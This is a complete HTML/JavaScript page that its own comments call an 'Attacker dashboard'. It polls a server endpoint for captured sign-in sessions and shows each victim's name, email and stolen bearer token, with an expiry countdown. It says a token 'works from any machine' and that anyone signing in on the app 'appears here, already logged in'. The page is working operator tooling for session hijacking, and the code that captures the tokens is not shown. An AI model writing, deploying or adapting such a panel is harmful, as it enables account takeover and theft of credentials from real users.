<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Acme Workspace</title>
<style>
  :root { --bg:#0b0d10; --card:#12151a; --ink:#e7ecf3; --muted:#8b97a7; --line:#232833; --brand:#3b5bdb; --ok:#34d399; --dead:#5b6675; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--ink); font:15px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:grid; place-items:center; min-height:100vh; }
  .card { width:min(560px,94vw); background:var(--card); border:1px solid var(--line); border-radius:16px; padding:24px 24px 20px; }
  .top { display:flex; align-items:center; gap:10px; margin-bottom:6px; }
  .logo { width:28px; height:28px; border-radius:8px; background:linear-gradient(135deg,var(--brand),#7048e8); }
  h1 { font-size:16px; margin:0; font-weight:700; }
  .tag { font-size:12px; color:var(--muted); }
  .bar { display:flex; justify-content:space-between; align-items:center; margin:16px 0 10px; }
  .count { font-size:13px; color:var(--muted); }
  .clear { font:inherit; font-size:12px; color:var(--muted); background:transparent; border:1px solid var(--line); border-radius:7px; padding:5px 10px; cursor:pointer; }
  .wait { text-align:center; padding:30px 0; color:var(--muted); }
  .dot { width:11px; height:11px; border-radius:50%; background:var(--brand); display:inline-block; margin-right:8px; animation:pulse 1.1s infinite; vertical-align:middle; }
  @keyframes pulse { 0%,100%{opacity:.25;} 50%{opacity:1;} }
  .row { display:flex; align-items:center; gap:12px; padding:11px; border:1px solid var(--line); border-radius:10px; margin-bottom:8px; }
  .row.dead { opacity:.5; }
  .av { width:38px; height:38px; border-radius:50%; background:linear-gradient(135deg,var(--brand),#7048e8); display:grid; place-items:center; font-weight:700; color:#fff; flex:0 0 auto; }
  .meta { flex:1; min-width:0; }
  .nm { font-weight:600; }
  .em { color:var(--muted); font-size:13px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .exp { font-size:12px; color:var(--ok); font-variant-numeric:tabular-nums; white-space:nowrap; }
  .exp.dead { color:var(--dead); }
  .open { font:inherit; font-size:13px; background:var(--brand); color:#fff; border:0; border-radius:8px; padding:7px 12px; cursor:pointer; }
  .welcome { text-align:center; padding:8px 0 4px; }
  .welcome .av { width:76px; height:76px; font-size:30px; margin:4px auto 12px; }
  .who { color:var(--muted); }
  .bigname { font-size:28px; font-weight:800; margin:4px 0; }
  .pill { display:inline-block; margin-top:14px; font-size:12px; color:var(--ok); border:1px solid #1f3b32; background:#0e1a16; padding:5px 12px; border-radius:999px; font-variant-numeric:tabular-nums; }
  .pill.dead { color:var(--dead); border-color:var(--line); background:transparent; }
  .back { float:left; font:inherit; font-size:13px; color:var(--muted); background:transparent; border:1px solid var(--line); border-radius:8px; padding:6px 10px; cursor:pointer; }
  .tok { margin-top:18px; text-align:left; font-size:12px; color:var(--muted); }
  .tok code { display:block; margin-top:6px; word-break:break-all; background:#0c0f13; border:1px solid var(--line); border-radius:8px; padding:10px; color:#9aa7b8; font:12px/1.5 ui-monospace,Consolas,monospace; }
</style>
</head>
<body>
<div class="card">
  <div class="top"><div class="logo"></div><div><h1>Acme Workspace</h1><div class="tag">session monitor</div></div></div>
  <div id="view"></div>
</div>

<script>
// Attacker dashboard: poll /x/sessions (the banked tokens) and list each captured login.
// "Open" shows the victim's Welcome screen and the stolen token, with a live expiry countdown.
const $ = (id) => document.getElementById(id);
const esc = (s) => String(s == null ? '' : s).replace(/[&<>"]/g, (c) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;' }[c]));
const initial = (n) => (String(n || '?').trim()[0] || '?').toUpperCase();
const mmss = (s) => { s = Math.max(0, s); return Math.floor(s / 60) + ':' + String(s % 60).padStart(2, '0'); };

let data = [], skew = 0, openId = null;
const left = (exp) => exp - (Math.floor(Date.now() / 1000) + skew);

function render() {
  if (openId) {
    const s = data.find((x) => x.id === openId);
    if (!s) { openId = null; return render(); }
    const secs = left(s.exp), dead = secs <= 0;
    $('view').innerHTML =
      '<button class="back" data-back>&larr; sessions</button>' +
      '<div class="welcome">' +
        '<div class="av">' + esc(initial(s.name)) + '</div>' +
        '<div class="who">Welcome</div>' +
        '<div class="bigname">' + esc(s.name) + '</div>' +
        '<div class="em">' + esc(s.email) + '</div>' +
        '<div class="pill ' + (dead ? 'dead' : '') + '">' + (dead ? 'session expired' : 'session active &middot; expires in ' + mmss(secs)) + '</div>' +
        '<div class="tok">bearer token (works from any machine until it expires):<code>' + esc(s.token) + '</code></div>' +
      '</div>';
    return;
  }
  let body = '<div class="bar"><span class="count">' + (data.length ? data.length + ' session' + (data.length > 1 ? 's' : '') + ' captured' : '') + '</span>' +
    (data.length ? '<button class="clear" data-clear>Clear</button>' : '') + '</div>';
  if (!data.length) {
    body += '<div class="wait"><div><span class="dot"></span><b>Waiting for a sign-in&hellip;</b></div>' +
      '<p>Anyone who signs in on the app appears here, already logged in.</p></div>';
  } else {
    for (const s of data) {
      const secs = left(s.exp), dead = secs <= 0;
      body += '<div class="row ' + (dead ? 'dead' : '') + '">' +
        '<div class="av">' + esc(initial(s.name)) + '</div>' +
        '<div class="meta"><div class="nm">' + esc(s.name) + '</div><div class="em">' + esc(s.email) + '</div></div>' +
        '<div class="exp ' + (dead ? 'dead' : '') + '">' + (dead ? 'expired' : 'expires in ' + mmss(secs)) + '</div>' +
        '<button class="open" data-open="' + esc(s.id) + '">Open</button></div>';
    }
  }
  $('view').innerHTML = body;
}

document.addEventListener('click', (e) => {
  const o = e.target.closest('[data-open]'); if (o) { openId = o.getAttribute('data-open'); return render(); }
  if (e.target.closest('[data-back]')) { openId = null; return render(); }
  if (e.target.closest('[data-clear]')) { fetch('/x/reset', { method: 'POST' }).then(() => { data = []; openId = null; render(); }); }
});

async function load() {
  try { const r = await (await fetch('/x/sessions')).json(); skew = r.now - Math.floor(Date.now() / 1000); data = r.sessions; render(); } catch (e) {}
}
setInterval(load, 1500);
setInterval(render, 1000);
load();
</script>
</body>
</html>
